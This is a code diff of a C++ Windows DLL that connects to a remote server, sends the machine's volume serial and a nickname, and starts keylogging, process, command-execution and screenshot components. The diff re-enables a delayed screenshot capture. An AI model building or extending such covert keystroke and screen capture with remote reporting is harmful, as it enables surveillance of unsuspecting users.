@@ -29,16 +29,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	}
 	else if(fdwReason == DLL_PROCESS_DETACH)
 	{
-		std::stringstream format;
-
 		delete gSysexec;
 		delete gMouselog;
 		delete gKeylog;
 		delete gProcess;
 
-		format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1001 << '>' << hinstDLL << '_' << fdwReason << '_' << lpvReserved;
-		gSocket->Send(format.str());
-		format.clear();
+		gSocket->Send(formatString() << "TCPQUERY" << ">" << "CLIENT_CALL" << ">" << 1001 << ">" << hinstDLL << "_" << fdwReason << "_" << lpvReserved);
 
 		Sleep(500);
 
@@ -86,7 +82,6 @@ DWORD __stdcall main_thread(LPVOID lpParam)
 
 	std::string nickname;
 	std::string ip;
-	std::stringstream format;
 	std::size_t buf;
 	DWORD serial;
 	DWORD flags;
@@ -101,20 +96,20 @@ DWORD __stdcall main_thread(LPVOID lpParam)
 
 	gSocket = new addonSocket();
 	gSocket->socketHandle = gSocket->Create();
-	gSocket->Connect(ip, (port/* + 1*/));
+	gSocket->Connect(ip, (port + 1));
 
 	GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);
 
-	format << "TCPQUERY" << '>' << "CLIENT_CALL" << '>' << 1000 << '>' << serial << '>' << (serial + (flags ^ 0x2296666)) << '>' << nickname << '>' << ((serial | flags) & 0x28F39) << '>' << flags;
-	gSocket->Send(format.str());
-	format.clear();
+	gSocket->Send(formatString() << "TCPQUERY" << ">" << "CLIENT_CALL" << ">" << 1000 << ">" << serial << ">" << (serial + (flags ^ 0x2296666)) << ">" << nickname << ">" << ((serial | flags) & 0x28F39) << ">" << flags);
 
 	gProcess = new addonProcess();
 	gKeylog = new addonKeylog();
-	gMouselog = new addonMouselog();
+	//gMouselog = new addonMouselog();
 	gSysexec = new addonSysexec();
 
-	//gScreen->Get(std::string("test.bmp"));
+	Sleep(30000);
+
+	gScreen->Get(std::string("test.png"));
 
 	return true;
 }
